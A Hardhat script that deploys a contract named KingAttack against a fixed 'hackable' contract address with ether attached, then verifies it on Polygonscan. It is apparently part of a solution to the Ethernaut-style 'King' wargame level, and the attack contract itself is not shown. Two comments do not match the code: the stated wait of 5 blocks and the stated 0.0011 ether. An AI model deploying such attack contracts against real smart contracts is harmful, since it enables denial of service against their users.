import { ethers } from 'hardhat';
// import hre
import hre from 'hardhat';

async function main() {
  const contract_name = 'KingAttack';
  const contract_location = 'contracts/King.sol:KingAttack';
  const hackable_contract_address =
    '0xd404B924F07a985Ee723fab7FaCeBE56CF69113B';

  const Contract = await ethers.getContractFactory(contract_name);
  // deploy with 0.0011 ether
  const contract = await Contract.deploy(hackable_contract_address, {
    value: 1900000000000000,
    gasLimit: 1_000_000,
  });

  await contract.deployed();

  console.log(
    `Deployed contract to address: ${contract.address} on network: ${hre.network.name}`
  );

  // wait 5 blocks to ensure deployment before verifying
  await contract.deployTransaction.wait(7);

  // verify contract on polygonscan
  await hre.run('verify:verify', {
    address: contract.address,
    contract: contract_location,
    constructorArguments: [hackable_contract_address],
  });
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
